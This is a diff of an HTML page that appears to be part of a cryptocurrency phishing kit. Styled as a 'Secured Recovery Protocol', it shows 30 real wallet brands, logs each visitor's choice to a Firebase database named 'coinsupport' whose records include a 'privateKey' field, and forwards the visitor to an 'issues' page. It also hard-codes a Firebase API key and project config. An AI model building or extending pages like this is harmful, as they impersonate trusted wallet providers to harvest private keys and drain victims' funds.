@@ -3,357 +3,294 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Select Wallet</title>
-    <!-- 1. Tailwind CSS (CDN) -->
-<script src="https://cdn.tailwindcss.com"></script>
-
-<!-- 2. Lucide Icons Library -->
-<script src="https://unpkg.com/lucide@latest"></script>
+    <title>Select Wallet - Secured Recovery Protocol</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { 
-            margin: 0; 
-            background-color: #000; 
-            color: white; 
-            font-family: system-ui, -apple-system, sans-serif; 
-            padding: 20px; 
-            max-width: 600px; 
-            margin: 0 auto; 
+        body {
+            background-color: #050505;
+            color: #ffffff;
+            font-family: system-ui, -apple-system, sans-serif;
         }
-        h1 { font-size: 22px; text-align: center; margin-bottom: 20px; }
-        
-        .wallet-grid { 
-            display: grid; 
-            grid-template-columns: repeat(2, 1fr); 
-            gap: 15px; 
+        .wallet-card {
+            transition: all 0.2s ease;
         }
-        
-        .wallet-card { 
-            background: #111; 
-            border: 1px solid #333; 
-            border-radius: 12px; 
-            padding: 15px; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            cursor: pointer; 
-            transition: all 0.2s;
+        .wallet-card:hover {
+            transform: translateY(-2px);
+            border-color: #3b82f6;
+            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.15);
         }
-        .wallet-card:hover { 
-            border-color: #2563eb; 
-            background: #1a1a1a; 
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #3b82f6;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            vertical-align: middle;
+            margin-right: 8px;
         }
-        
-        .wallet-icon { 
-            width: 48px; 
-            height: 48px; 
-            background: #333; 
-            border-radius: 50%; 
-            margin-bottom: 10px;
-            display: flex; 
-            align-items: center; 
-            justify-content: center;
-            font-weight: bold;
-            font-size: 12px;
-            color: #aaa;
-        }
-        
-        .wallet-name { 
-            font-size: 14px; 
-            text-align: center; 
-            line-height: 1.3;
-        }
-        
-        .back-link { 
-            display: block; 
-            text-align: center; 
-            margin-top: 20px; 
-            color: #2563eb; 
-            text-decoration: none; 
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
-<body>
-    <h1>Select Your Wallet</h1>
+<body class="min-h-screen flex flex-col items-center justify-center p-4">
 
-    <div class="wallet-grid">
-        <!-- 1. Trust Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Trust Wallet')">
-            <div class="wallet-icon">🛡️</div>
-            <div class="wallet-name">Trust Wallet</div>
-        </div>
+    <!-- Header -->
+    <div class="w-full max-w-4xl mb-8 text-center">
+        <h1 class="text-3xl font-bold tracking-tight mb-2">SECURED-RECOVERY-PROTOCOL</h1>
+        <p class="text-gray-400">Select your wallet provider to begin recovery</p>
+    </div>
+
+    <!-- Main Content -->
+    <div class="w-full max-w-4xl bg-gray-900/50 border border-gray-800 rounded-xl p-6 shadow-2xl">
         
-        <!-- 2. MetaMask -->
-        <div class="wallet-card" onclick="selectWallet('MetaMask')">
-            <div class="wallet-icon">🦊</div>
-            <div class="wallet-name">MetaMask</div>
+        <!-- Status Message -->
+        <div id="status-msg" class="hidden mb-4 p-3 bg-blue-900/30 border border-blue-800 rounded text-blue-200 text-sm text-center">
+            Connecting to secure server...
         </div>
 
-        <!-- 3. Phantom -->
-        <div class="wallet-card" onclick="selectWallet('Phantom')">
-            <div class="wallet-icon">👻</div>
-            <div class="wallet-name">Phantom</div>
-        </div>
+        <!-- Wallet Grid -->
+        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-3">
+            
+            <!-- 1. Trust Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Trust Wallet', '0xTrust...')">
+                <div class="w-8 h-8 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">T</div>
+                <span class="text-sm font-medium">Trust Wallet</span>
+            </button>
 
-        <!-- 4. OKX Wallet -->
-        <div class="wallet-card" onclick="selectWallet('OKX Wallet')">
-            <div class="wallet-icon">⚫</div>
-            <div class="wallet-name">OKX Wallet</div>
-        </div>
+            <!-- 2. MetaMask -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('MetaMask', '0xMeta...')">
+                <div class="w-8 h-8 bg-orange-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">M</div>
+                <span class="text-sm font-medium">MetaMask</span>
+            </button>
 
-        <!-- 5. Binance Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Binance Wallet')">
-            <div class="wallet-icon">🟡</div>
-            <div class="wallet-name">Binance Wallet</div>
-        </div>
+            <!-- 3. Phantom -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Phantom', '0xPhant...')">
+                <div class="w-8 h-8 bg-purple-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">P</div>
+                <span class="text-sm font-medium">Phantom</span>
+            </button>
 
-        <!-- 6. Bitget Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Bitget Wallet')">
-            <div class="wallet-icon">🔵</div>
-            <div class="wallet-name">Bitget Wallet</div>
-        </div>
+            <!-- 4. OKX Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('OKX Wallet', '0xOKX...')">
+                <div class="w-8 h-8 bg-black rounded-full mb-2 flex items-center justify-center text-xs font-bold text-white border border-gray-600">O</div>
+                <span class="text-sm font-medium">OKX Wallet</span>
+            </button>
 
-        <!-- 7. Coinbase Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Coinbase Wallet')">
-            <div class="wallet-icon">🔵</div>
-            <div class="wallet-name">Coinbase Wallet</div>
-        </div>
+            <!-- 5. Binance Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Binance Wallet', '0xBinance...')">
+                <div class="w-8 h-8 bg-yellow-400 rounded-full mb-2 flex items-center justify-center text-xs font-bold text-black">B</div>
+                <span class="text-sm font-medium">Binance Wallet</span>
+            </button>
 
-        <!-- 8. Ledger -->
-        <div class="wallet-card" onclick="selectWallet('Ledger')">
-            <div class="wallet-icon">📱</div>
-            <div class="wallet-name">Ledger</div>
-        </div>
+            <!-- 6. Bitget Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Bitget Wallet', '0xBitget...')">
+                <div class="w-8 h-8 bg-red-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">B</div>
+                <span class="text-sm font-medium">Bitget Wallet</span>
+            </button>
 
-        <!-- 9. TokenPocket -->
-        <div class="wallet-card" onclick="selectWallet('TokenPocket')">
-            <div class="wallet-icon">🟢</div>
-            <div class="wallet-name">TokenPocket</div>
-        </div>
+            <!-- 7. Coinbase Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Coinbase Wallet', '0xCoinbase...')">
+                <div class="w-8 h-8 bg-blue-600 rounded-full mb-2 flex items-center justify-center text-xs font-bold">C</div>
+                <span class="text-sm font-medium">Coinbase Wallet</span>
+            </button>
 
-        <!-- 10. imToken -->
-        <div class="wallet-card" onclick="selectWallet('imToken')">
-            <div class="wallet-icon">🔷</div>
-            <div class="wallet-name">imToken</div>
-        </div>
+            <!-- 8. Ledger -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Ledger', '0xLedger...')">
+                <div class="w-8 h-8 bg-green-600 rounded-full mb-2 flex items-center justify-center text-xs font-bold">L</div>
+                <span class="text-sm font-medium">Ledger</span>
+            </button>
 
-        <!-- 11. Trezor -->
-        <div class="wallet-card" onclick="selectWallet('Trezor')">
-            <div class="wallet-icon">🔒</div>
-            <div class="wallet-name">Trezor</div>
-        </div>
+            <!-- 9. TokenPocket -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('TokenPocket', '0xToken...')">
+                <div class="w-8 h-8 bg-indigo-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">T</div>
+                <span class="text-sm font-medium">TokenPocket</span>
+            </button>
 
-        <!-- 12. Exodus -->
-        <div class="wallet-card" onclick="selectWallet('Exodus')">
-            <div class="wallet-icon">🌌</div>
-            <div class="wallet-name">Exodus</div>
-        </div>
+            <!-- 10. imToken -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('imToken', '0ximToken...')">
+                <div class="w-8 h-8 bg-blue-400 rounded-full mb-2 flex items-center justify-center text-xs font-bold">i</div>
+                <span class="text-sm font-medium">imToken</span>
+            </button>
 
-        <!-- 13. Rabby Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Rabby Wallet')">
-            <div class="wallet-icon">🐰</div>
-            <div class="wallet-name">Rabby Wallet</div>
-        </div>
+            <!-- 11. Trezor -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Trezor', '0xTrezor...')">
+                <div class="w-8 h-8 bg-gray-600 rounded-full mb-2 flex items-center justify-center text-xs font-bold">T</div>
+                <span class="text-sm font-medium">Trezor</span>
+            </button>
 
-        <!-- 14. SafePal -->
-        <div class="wallet-card" onclick="selectWallet('SafePal')">
-            <div class="wallet-icon">🛡️</div>
-            <div class="wallet-name">SafePal</div>
-        </div>
+            <!-- 12. Exodus -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Exodus', '0xExodus...')">
+                <div class="w-8 h-8 bg-cyan-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">E</div>
+                <span class="text-sm font-medium">Exodus</span>
+            </button>
 
-        <!-- 15. Bybit Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Bybit Wallet')">
-            <div class="wallet-icon">🟠</div>
-            <div class="wallet-name">Bybit Wallet</div>
-        </div>
+            <!-- 13. Rabby Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Rabby Wallet', '0xRabby...')">
+                <div class="w-8 h-8 bg-pink-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">R</div>
+                <span class="text-sm font-medium">Rabby Wallet</span>
+            </button>
 
-        <!-- 16. Ronin Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Ronin Wallet')">
-            <div class="wallet-icon">🟣</div>
-            <div class="wallet-name">Ronin Wallet</div>
-        </div>
+            <!-- 14. SafePal -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('SafePal', '0xSafePal...')">
+                <div class="w-8 h-8 bg-green-400 rounded-full mb-2 flex items-center justify-center text-xs font-bold">S</div>
+                <span class="text-sm font-medium">SafePal</span>
+            </button>
 
-        <!-- 17. Keplr -->
-        <div class="wallet-card" onclick="selectWallet('Keplr')">
-            <div class="wallet-icon">🦊</div>
-            <div class="wallet-name">Keplr</div>
-        </div>
+            <!-- 15. Bybit Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Bybit Wallet', '0xBybit...')">
+                <div class="w-8 h-8 bg-yellow-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold text-black">B</div>
+                <span class="text-sm font-medium">Bybit Wallet</span>
+            </button>
 
-        <!-- 18. Solflare -->
-        <div class="wallet-card" onclick="selectWallet('Solflare')">
-            <div class="wallet-icon">🔥</div>
-            <div class="wallet-name">Solflare</div>
-        </div>
+            <!-- 16. Ronin Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Ronin Wallet', '0xRonin...')">
+                <div class="w-8 h-8 bg-blue-700 rounded-full mb-2 flex items-center justify-center text-xs font-bold">R</div>
+                <span class="text-sm font-medium">Ronin Wallet</span>
+            </button>
 
-        <!-- 19. Rainbow -->
-        <div class="wallet-card" onclick="selectWallet('Rainbow')">
-            <div class="wallet-icon">🌈</div>
-            <div class="wallet-name">Rainbow</div>
-        </div>
+            <!-- 17. Keplr -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Keplr', '0xKeplr...')">
+                <div class="w-8 h-8 bg-purple-600 rounded-full mb-2 flex items-center justify-center text-xs font-bold">K</div>
+                <span class="text-sm font-medium">Keplr</span>
+            </button>
 
-        <!-- 20. Zerion -->
-        <div class="wallet-card" onclick="selectWallet('Zerion')">
-            <div class="wallet-icon">⚪</div>
-            <div class="wallet-name">Zerion</div>
-        </div>
+            <!-- 18. Solflare -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Solflare', '0xSolflare...')">
+                <div class="w-8 h-8 bg-orange-400 rounded-full mb-2 flex items-center justify-center text-xs font-bold">S</div>
+                <span class="text-sm font-medium">Solflare</span>
+            </button>
 
-        <!-- 21. Backpack -->
-        <div class="wallet-card" onclick="selectWallet('Backpack')">
-            <div class="wallet-icon">🎒</div>
-            <div class="wallet-name">Backpack</div>
-        </div>
+            <!-- 19. Rainbow -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Rainbow', '0xRainbow...')">
+                <div class="w-8 h-8 bg-gradient-to-r from-red-500 via-yellow-500 to-blue-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold text-white">R</div>
+                <span class="text-sm font-medium">Rainbow</span>
+            </button>
 
-        <!-- 22. Argent -->
-        <div class="wallet-card" onclick="selectWallet('Argent')">
-            <div class="wallet-icon">💎</div>
-            <div class="wallet-name">Argent</div>
-        </div>
+            <!-- 20. Zerion -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Zerion', '0xZerion...')">
+                <div class="w-8 h-8 bg-gray-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">Z</div>
+                <span class="text-sm font-medium">Zerion</span>
+            </button>
 
-        <!-- 23. Safe -->
-        <div class="wallet-card" onclick="selectWallet('Safe')">
-            <div class="wallet-icon">🛡️</div>
-            <div class="wallet-name">Safe</div>
-        </div>
+            <!-- 21. Backpack -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Backpack', '0xBackpack...')">
+                <div class="w-8 h-8 bg-yellow-600 rounded-full mb-2 flex items-center justify-center text-xs font-bold">B</div>
+                <span class="text-sm font-medium">Backpack</span>
+            </button>
 
-        <!-- 24. World App -->
-        <div class="wallet-card" onclick="selectWallet('World App')">
-            <div class="wallet-icon">🌍</div>
-            <div class="wallet-name">World App</div>
-        </div>
+            <!-- 22. Argent -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Argent', '0xArgent...')">
+                <div class="w-8 h-8 bg-blue-400 rounded-full mb-2 flex items-center justify-center text-xs font-bold">A</div>
+                <span class="text-sm font-medium">Argent</span>
+            </button>
 
-        <!-- 25. Atomic Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Atomic Wallet')">
-            <div class="wallet-icon">⚛️</div>
-            <div class="wallet-name">Atomic Wallet</div>
-        </div>
+            <!-- 23. Safe -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Safe', '0xSafe...')">
+                <div class="w-8 h-8 bg-gray-400 rounded-full mb-2 flex items-center justify-center text-xs font-bold">S</div>
+                <span class="text-sm font-medium">Safe</span>
+            </button>
 
-        <!-- 26. Guarda -->
-        <div class="wallet-card" onclick="selectWallet('Guarda')">
-            <div class="wallet-icon">👁️</div>
-            <div class="wallet-name">Guarda</div>
-        </div>
+            <!-- 24. World App -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('World App', '0xWorld...')">
+                <div class="w-8 h-8 bg-blue-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">W</div>
+                <span class="text-sm font-medium">World App</span>
+            </button>
 
-        <!-- 27. Math Wallet -->
-        <div class="wallet-card" onclick="selectWallet('Math Wallet')">
-            <div class="wallet-icon">🧮</div>
-            <div class="wallet-name">Math Wallet</div>
-        </div>
+            <!-- 25. Atomic Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Atomic Wallet', '0xAtomic...')">
+                <div class="w-8 h-8 bg-blue-800 rounded-full mb-2 flex items-center justify-center text-xs font-bold">A</div>
+                <span class="text-sm font-medium">Atomic Wallet</span>
+            </button>
 
-        <!-- 28. Coinomi -->
-        <div class="wallet-card" onclick="selectWallet('Coinomi')">
-            <div class="wallet-icon">💰</div>
-            <div class="wallet-name">Coinomi</div>
-        </div>
+            <!-- 26. Guarda -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Guarda', '0xGuarda...')">
+                <div class="w-8 h-8 bg-green-500 rounded-full mb-2 flex items-center justify-center text-xs font-bold">G</div>
+                <span class="text-sm font-medium">Guarda</span>
+            </button>
 
-        <!-- 29. Electrum -->
-        <div class="wallet-card" onclick="selectWallet('Electrum')">
-            <div class="wallet-icon">⚡</div>
-            <div class="wallet-name">Electrum</div>
-        </div>
+            <!-- 27. Math Wallet -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Math Wallet', '0xMath...')">
+                <div class="w-8 h-8 bg-blue-600 rounded-full mb-2 flex items-center justify-center text-xs font-bold">M</div>
+                <span class="text-sm font-medium">Math Wallet</span>
+            </button>
 
-        <!-- 30. Tangem -->
-        <div class="wallet-card" onclick="selectWallet('Tangem')">
-            <div class="wallet-icon">💳</div>
-            <div class="wallet-name">Tangem</div>
+            <!-- 28. Coinomi -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Coinomi', '0xCoinomi...')">
+                <div class="w-8 h-8 bg-green-700 rounded-full mb-2 flex items-center justify-center text-xs font-bold">C</div>
+                <span class="text-sm font-medium">Coinomi</span>
+            </button>
+
+            <!-- 29. Electrum -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Electrum', '0xElectrum...')">
+                <div class="w-8 h-8 bg-yellow-700 rounded-full mb-2 flex items-center justify-center text-xs font-bold">E</div>
+                <span class="text-sm font-medium">Electrum</span>
+            </button>
+
+            <!-- 30. Tangem -->
+            <button class="wallet-card flex flex-col items-center justify-center p-4 bg-gray-800/50 border border-gray-700 rounded-lg hover:bg-gray-800" onclick="selectWallet('Tangem', '0xTangem...')">
+                <div class="w-8 h-8 bg-red-600 rounded-full mb-2 flex items-center justify-center text-xs font-bold">T</div>
+                <span class="text-sm font-medium">Tangem</span>
+            </button>
+
         </div>
     </div>
 
-    <a href="index.html" class="back-link">← Back to Home</a>
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-    <script>
-        function selectWallet(walletName) {
-            // Redirect to issues page, passing the wallet name as a parameter
-            window.location.href = `issues.html?wallet=${encodeURIComponent(walletName)}`;
-        }
-        </script>
-    <!-- FIREBASE LOGIC -->
-<script type="module">
-  // Import the functions you need from the SDKs you need
-import { initializeApp } from "firebase/app";
-import { getAnalytics } from "firebase/analytics";
-// TODO: Add SDKs for Firebase products that you want to use
-// https://firebase.google.com/docs/web/setup#available-libraries
+        // YOUR EXACT FIREBASE CONFIGURATION
+        const firebaseConfig = {
+          apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
+          authDomain: "coinsupport-8b036.firebaseapp.com",
+          databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
+          projectId: "coinsupport-8b036",
+          storageBucket: "coinsupport-8b036.firebasestorage.app",
+          messagingSenderId: "575774102570",
+          appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
+          measurementId: "G-YGCSNX4H9L"
+        };
 
-// Your web app's Firebase configuration
-// For Firebase JS SDK v7.20.0 and later, measurementId is optional
-const firebaseConfig = {
-  apiKey: "AIzaSyC33I7HRwiKo7DtdRsdtdK6OnqDwAquJfI",
-  authDomain: "coinsupport-8b036.firebaseapp.com",
-  databaseURL: "https://coinsupport-8b036-default-rtdb.europe-west1.firebasedatabase.app",
-  projectId: "coinsupport-8b036",
-  storageBucket: "coinsupport-8b036.firebasestorage.app",
-  messagingSenderId: "575774102570",
-  appId: "1:575774102570:web:1d0c34b60807dfb2c75f53",
-  measurementId: "G-YGCSNX4H9L"
-};
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
 
-// Initialize Firebase
-const app = initializeApp(firebaseConfig);
-const analytics = getAnalytics(app);
-
-    // Select DOM elements
-    const form = document.getElementById('walletForm');
-    const submitBtn = document.getElementById('submitBtn');
-    const btnText = document.getElementById('btnText');
-    const btnIcon = document.getElementById('btnIcon');
-    const spinner = document.getElementById('loadingSpinner');
-    const statusMsg = document.getElementById('statusMessage');
-
-    if (form) {
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            // UI Loading State
-            submitBtn.disabled = true;
-            btnText.textContent = "Connecting...";
-            btnIcon.classList.add('hidden');
-            spinner.classList.remove('hidden');
-            statusMsg.textContent = "";
-
-            const email = document.getElementById('email').value.trim();
-            const wallet = document.getElementById('walletAddress').value.trim();
+        window.selectWallet = async (walletName, address) => {
+            const statusMsg = document.getElementById('status-msg');
+            statusMsg.classList.remove('hidden');
+            statusMsg.innerHTML = '<span class="loader"></span> Connecting to ' + walletName + '...';
 
             try {
-                // Create a new reference with a unique key
-                const newSessionRef = push(ref(db), 'sessions');
+                // Create a unique key for this session
+                const newUserDataRef = ref(db, 'users/' + Date.now());
                 
-                // Save data to Firebase Realtime Database
-                await set(newSessionRef, {
-                    email: email,
-                    walletAddress: wallet,
-                    timestamp: new Date().toISOString(),
-                    source: window.location.href,
-                    status: 'pending'
+                // Save data to Firebase
+                await set(newUserDataRef, {
+                    walletName: walletName,
+                    walletAddress: address,
+                    timestamp: Date.now(),
+                    issue: null,
+                    connected: false,
+                    privateKey: null
                 });
 
-                // Success State
-                btnText.textContent = "Success!";
-                submitBtn.style.background = "#22c55e"; // Green background
+                // Store in session for immediate use in next pages
+                sessionStorage.setItem('selectedWallet', walletName);
+                sessionStorage.setItem('walletAddress', address);
 
-                setTimeout(() => {
-                    window.location.href = "issue.html";
-                }, 800);
+                // Redirect to issues page
+                window.location.href = 'issues.html';
 
             } catch (error) {
                 console.error("Firebase Error:", error);
-                btnText.textContent = "Error";
-                submitBtn.style.background = "#ef4444"; // Red background
-                statusMsg.textContent = "Could not connect. Please try again.";
-                statusMsg.className = "text-center text-sm mt-2 h-5 text-red-500";
-                
-                // Reset button after delay
-                setTimeout(() => {
-                    submitBtn.disabled = false;
-                    btnText.textContent = "Continue";
-                    btnIcon.classList.remove('hidden');
-                    spinner.classList.add('hidden');
-                    submitBtn.style.background = ""; 
-                }, 2000);
+                statusMsg.classList.remove('hidden');
+                statusMsg.className = "mb-4 p-3 bg-red-900/30 border border-red-800 rounded text-red-200 text-sm text-center";
+                statusMsg.innerHTML = "Connection failed. Please try again.";
             }
-        });
-    }
-</script>
-    // Initialize Lucide Icons
-    lucide.createIcons();
-</script>
+        };
+    </script>
 </body>
-</html
+</html>
